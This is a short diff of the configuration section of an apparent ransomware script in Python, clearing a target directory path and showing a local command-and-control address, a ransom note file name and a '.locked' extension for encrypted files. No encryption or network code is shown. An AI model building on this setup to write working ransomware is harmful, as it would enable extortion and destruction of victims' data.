@@ -5,7 +5,7 @@ import socket
 import time
 
 # Configuration
-TARGET_DIR = r"C:\Users\lamic\OneDrive\Desktop\vscode\Ransomwaretttackfile_test"  # Directory with target files
+TARGET_DIR = r""  # Directory with target files
 C2_SERVER = ("127.0.0.1", 2003)  # Local C2 server
 RANSOM_NOTE = "payransom.txt"
 ENCRYPTED_EXTENSION = ".locked"  # New extension for encrypted files
